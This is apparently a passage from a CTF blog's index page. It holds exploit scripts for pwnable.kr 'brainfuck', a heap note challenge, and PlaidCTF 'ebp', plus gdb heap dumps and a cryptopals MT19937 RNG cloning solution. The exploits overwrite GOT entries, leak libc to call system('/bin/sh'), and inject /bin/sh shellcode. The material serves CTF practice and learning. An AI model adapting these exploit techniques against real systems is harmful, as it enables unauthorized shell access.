+ l32(bk)</span><br><span class="line">payload += <span class="string">'A'</span>*(<span class="number">0x80</span><span class="number">-0x10</span>)</span><br><span class="line">payload += l32(<span class="number">0x80</span>) + l32(<span class="number">0x88</span>)</span><br><span class="line">payload += <span class="string">'B'</span>*<span class="number">0x80</span></span><br><span class="line">payload += l32(<span class="number">0</span>) + l32(<span class="number">0x89</span>) <span class="comment">#+ 'C'*0x60</span></span><br><span class="line"><span class="comment">#Exit()</span></span><br><span class="line"></span><br><span class="line">New_Note(payload)</span><br><span class="line">Delete_Note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x0804a29c</span></span><br><span class="line">payload2  = <span class="string">''</span></span><br><span class="line">payload2 += l32(<span class="number">3</span>)</span><br><span class="line">payload2 += l32(<span class="number">1</span>) + l32(<span class="number">4</span>) + l32(bin_sh)</span><br><span class="line">payload2 += l32(<span class="number">1</span>) + l32(<span class="number">4</span>) + l32(free_got)</span><br><span class="line">payload2 += <span class="string">'C'</span>*(len(payload)-len(payload2))</span><br><span class="line">Edit_Note(<span class="number">0</span>,payload2)</span><br><span class="line"><span class="comment">#List_Note()</span></span><br><span class="line">Edit_Note(<span class="number">1</span>,l32(system))</span><br><span class="line"><span class="comment">#List_Note()</span></span><br><span class="line">Delete_Note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">20w</span>x <span class="number">0</span>x96cf000</span><br><span class="line"><span class="number">0</span>x96cf000:	<span class="number">0x00000000</span>	<span class="number">0x00000c19</span>	<span class="number">0x00000100</span>	<span class="number">0x00000003</span></span><br><span class="line"><span class="number">0</span>x96cf010:	<span class="number">0x00000001</span>	<span class="number">0x00000080</span>	<span class="number">0</span>x096cfc20	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0</span>x96cf020:	<span class="number">0x00000080</span>	<span class="number">0</span>x096cfca8	<span class="number">0x00000001</span>	<span class="number">0x00000080</span></span><br><span class="line"><span class="number">0</span>x96cf030:	<span class="number">0</span>x096cfd30	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0</span>x096cfdb8</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">110w</span>x <span class="number">0</span>x96cfc18</span><br><span class="line"><span class="number">0</span>x96cfc18:	<span class="number">0x00000000</span>	<span class="number">0x00000089</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc28:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc38:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc48:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc58:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc68:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc78:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc88:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0</span>x96cfc98:	<span class="number">0x41414141</span>	<span class="number">0x41414141</span>	<span class="number">0x00000088</span>	<span class="number">0x00000089</span></span><br><span class="line"><span class="number">0</span>x96cfca8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcb8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcc8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcd8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfce8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcf8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd08:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd18:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd28:	<span class="number">0x00000000</span>	<span class="number">0x00000089</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd38:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd48:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd58:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd68:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd78:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd88:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfd98:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x43434343</span></span><br><span class="line"><span class="number">0</span>x96cfda8:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x00000198</span>	<span class="number">0x00020251</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">20w</span>x <span class="number">0</span>x96cf000</span><br><span class="line"><span class="number">0</span>x96cf000:	<span class="number">0x00000000</span>	<span class="number">0x00000c19</span>	<span class="number">0x00000100</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0</span>x96cf010:	<span class="number">0x00000001</span>	<span class="number">0x00000180</span>	<span class="number">0</span>x096cfc20	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0</span>x96cf020:	<span class="number">0x00000000</span>	<span class="number">0</span>x096cfca8	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0</span>x96cf030:	<span class="number">0</span>x096cfd30	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0</span>x096cfdb8</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">110w</span>x <span class="number">0</span>x96cfc18</span><br><span class="line"><span class="number">0</span>x96cfc18:	<span class="number">0x00000000</span>	<span class="number">0x00000189</span>	<span class="number">0x00000000</span>	<span class="number">0x00000081</span></span><br><span class="line"><span class="number">0</span>x96cfc28:	<span class="number">0</span>x096cf00c	<span class="number">0</span>x096cf010	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc38:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc48:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc58:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc68:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc78:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc88:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfc98:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x00000080</span>	<span class="number">0x00000088</span></span><br><span class="line"><span class="number">0</span>x96cfca8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcb8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcc8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcd8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfce8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfcf8:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd08:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd18:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd28:	<span class="number">0x00000000</span>	<span class="number">0x00000089</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd38:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd48:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd58:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd68:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd78:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd88:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x42424242</span></span><br><span class="line"><span class="number">0</span>x96cfd98:	<span class="number">0x42424242</span>	<span class="number">0x42424242</span>	<span class="number">0x43434343</span>	<span class="number">0x00020261</span></span><br><span class="line"><span class="number">0</span>x96cfda8:	<span class="number">0x43434343</span>	<span class="number">0x43434343</span>	<span class="number">0x00000198</span>	<span class="number">0x00020251</span></span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Pwnable-kr-brainfuck" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/10/Pwnable-kr-brainfuck/" class="article-date">
  	<time datetime="2015-12-10T15:54:16.000Z" itemprop="datePublished">2015-12-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/10/Pwnable-kr-brainfuck/">Pwnable.kr-brainfuck</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/bf">bf</a> <a href="http://bigtang.org/files/bf_libc.so">bf_libc.so</a></p>
</blockquote>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">offset_gets   = <span class="number">0x66e50</span></span><br><span class="line">offset_fgets  = <span class="number">0x65bc0</span></span><br><span class="line">offset_system = <span class="number">0x3f250</span></span><br><span class="line">main = <span class="number">0x08048671</span></span><br><span class="line"></span><br><span class="line">target = (<span class="string">'pwnable.kr'</span>,<span class="number">9001</span>) </span><br><span class="line"><span class="built_in">io</span> = zio(target,timeout=<span class="number">100000</span>,print_read=COLORED(REPR,<span class="string">"yellow"</span>),\</span><br><span class="line">	print_write=COLORED(REPR,<span class="string">"red"</span>))</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'[ ]\n'</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'&lt;'</span>*(<span class="number">0xa0</span><span class="number">-0x10</span>)</span><br><span class="line">payload += <span class="string">'.&gt;.&gt;.&gt;.'</span></span><br><span class="line">payload += <span class="string">'&lt;&lt;&lt;'</span></span><br><span class="line">payload += <span class="string">',&gt;,&gt;,&gt;,&gt;'</span></span><br><span class="line">payload += <span class="string">'&gt;'</span>*<span class="number">24</span></span><br><span class="line">payload += <span class="string">',&gt;,&gt;,&gt;,&gt;'</span></span><br><span class="line">payload += <span class="string">',&gt;,&gt;,&gt;,&gt;.'</span></span><br><span class="line"></span><br><span class="line">#<span class="built_in">io</span>.gdb_hint([<span class="number">0x8048655</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.writeline(payload)</span><br><span class="line">fgets = l32(<span class="built_in">io</span>.read(<span class="number">4</span>))</span><br><span class="line">#<span class="built_in">print</span> hex(fgets)</span><br><span class="line">system = fgets-offset_fgets+offset_system</span><br><span class="line">gets   = fgets-offset_fgets+offset_gets</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.write(l32(system))</span><br><span class="line"><span class="built_in">io</span>.write(l32(gets))</span><br><span class="line"><span class="built_in">io</span>.write(l32(main))</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="built_in">io</span>.interact()</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Clone-an-MT19937-RNG-from-its-output" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/01/Clone-an-MT19937-RNG-from-its-output/" class="article-date">
  	<time datetime="2015-12-01T03:01:50.000Z" itemprop="datePublished">2015-12-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/01/Clone-an-MT19937-RNG-from-its-output/">Clone_an_MT19937_RNG_from_its_output</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Problem : <a href="http://cryptopals.com/sets/3/challenges/23/" target="_blank" rel="external">Clone_an_MT19937_RNG_from_its_output</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># Written against python 3.3.1</span></span><br><span class="line"><span class="comment"># Matasano Problem 21,22</span></span><br><span class="line"><span class="comment"># Implement the MT19937 Mersenne Twister RNG</span></span><br><span class="line"><span class="comment"># generated from code on the wikipedia</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MT19937</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.MT = [<span class="number">0</span>] * <span class="number">624</span>;</span><br><span class="line">        self.index = <span class="number">0</span>;</span><br><span class="line">        self.seed = <span class="number">0</span>;</span><br><span class="line">        self.initialize_generator(seed);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize_generator</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        self.MT[<span class="number">0</span>] = seed;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">624</span>):</span><br><span class="line">            self.MT[i] = <span class="number">0xffffffff</span> &amp; (<span class="number">0x6c078965</span> * (self.MT[i<span class="number">-1</span>] ^ (self.MT[i<span class="number">-1</span>] &gt;&gt; <span class="number">30</span>)) + i);</span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_number</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (self.index == <span class="number">0</span>):</span><br><span class="line">            self.generate_numbers();</span><br><span class="line">            </span><br><span class="line">        y = self.MT[self.index];        </span><br><span class="line">        y = y ^ (y &gt;&gt; <span class="number">11</span>);</span><br><span class="line">        y = y ^ ((y &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>);</span><br><span class="line">        y = y ^ ((y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>);</span><br><span class="line">        y = y ^ (y &gt;&gt; <span class="number">18</span>);</span><br><span class="line">        </span><br><span class="line">        self.index = (self.index+<span class="number">1</span>)%<span class="number">624</span></span><br><span class="line">        <span class="keyword">return</span> y;</span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_numbers</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            y = (self.MT[i] &amp; <span class="number">0x80000000</span>) + (self.MT[(i+<span class="number">1</span>)%<span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">            self.MT[i] = self.MT[(i+<span class="number">397</span>)%<span class="number">624</span>] ^ (y &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ((y%<span class="number">2</span>) != <span class="number">0</span>):</span><br><span class="line">                self.MT[i] = self.MT[i] ^ <span class="number">0x9908b0df</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">temper</span><span class="params">(y)</span>:</span></span><br><span class="line">    y = y ^ (y &gt;&gt; <span class="number">11</span>);</span><br><span class="line">    y = y ^ ((y &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>);</span><br><span class="line">    y = y ^ ((y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>);</span><br><span class="line">    y = y ^ (y &gt;&gt; <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">untemper</span><span class="params">(y)</span>:</span></span><br><span class="line">    y3 = (y &amp; <span class="number">0xffffc000</span>);</span><br><span class="line">    y3 |= ((y &gt;&gt; <span class="number">18</span>) ^ (y&amp;<span class="number">0x3fff</span>));</span><br><span class="line">    y2 = (y3 &amp; <span class="number">0x1039ffff</span>);</span><br><span class="line">    y2 |= ((y3 ^ ((y2 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>)) &amp; <span class="number">0xfffe0000</span>);</span><br><span class="line">    y1 = y2 &amp; <span class="number">0x7f</span>;</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>) ^ y2) &amp; (<span class="number">0x7f</span> &lt;&lt; <span class="number">7</span>));</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>) ^ y2) &amp; (<span class="number">0x7f</span> &lt;&lt; <span class="number">14</span>));</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>) ^ y2) &amp; (<span class="number">0x7f</span> &lt;&lt; <span class="number">21</span>));</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>) ^ y2) &amp; <span class="number">0xf0000000</span>);</span><br><span class="line">    y0 = (y1 &amp; <span class="number">0xffe00000</span>);</span><br><span class="line">    y0 |= (((y0 &gt;&gt; <span class="number">11</span>) ^ y1) &amp; <span class="number">0x001ffc00</span>);</span><br><span class="line">    y0 |= (((y0 &gt;&gt; <span class="number">11</span>) ^ y1) &amp; <span class="number">0x3ff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y0;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cloneMT</span><span class="params">(dolly)</span>:</span></span><br><span class="line">    clone = MT19937(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">        clone.MT[i] = untemper(dolly.extract_number());</span><br><span class="line">    <span class="keyword">return</span> clone;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    dolly = MT19937(<span class="number">8675309</span>);</span><br><span class="line">    clone = cloneMT(dolly);</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        print(dolly.extract_number(),clone.extract_number());</span><br><span class="line">    print(<span class="string">"Clone succeeded"</span>);</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-PlaidCTF-2015-Quals-ebp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/01/PlaidCTF-2015-Quals-ebp/" class="article-date">
  	<time datetime="2015-12-01T02:44:58.000Z" itemprop="datePublished">2015-12-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/01/PlaidCTF-2015-Quals-ebp/">PlaidCTF-2015-Quals-ebp</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/ebp_a96f7231ab81e1b0d7fe24d660def25a.elf">ebp_a96f7231ab81e1b0d7fe24d660def25a.elf</a></p>
</blockquote>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">shellcode = (  # /bin/sh shellcode at http://shell-storm.org/shellcode/files/shellcode-236.php</span><br><span class="line">        "<span class="tag">\<span class="name">x</span></span>6a<span class="tag">\<span class="name">x</span></span>0b<span class="tag">\<span class="name">x</span></span>58<span class="tag">\<span class="name">x</span></span>99<span class="tag">\<span class="name">x</span></span>52<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>2f"</span><br><span class="line">        "<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>62<span class="tag">\<span class="name">x</span></span>69<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>54"</span><br><span class="line">        "<span class="tag">\<span class="name">x</span></span>5b<span class="tag">\<span class="name">x</span></span>52<span class="tag">\<span class="name">x</span></span>53<span class="tag">\<span class="name">x</span></span>54<span class="tag">\<span class="name">x</span></span>59<span class="tag">\<span class="name">x</span></span>0f<span class="tag">\<span class="name">x</span></span>34"</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io = zio(('127.0.0.1',2333),timeout=2333)</span><br><span class="line">#raw_input()</span><br><span class="line">io.writeline("<span class="comment">%4$x")</span></span><br><span class="line">ebp = (int(io.read(8),16)-0x1c) &amp; 0xffff</span><br><span class="line">print "[+] Leaked Address: ", hex(ebp)</span><br><span 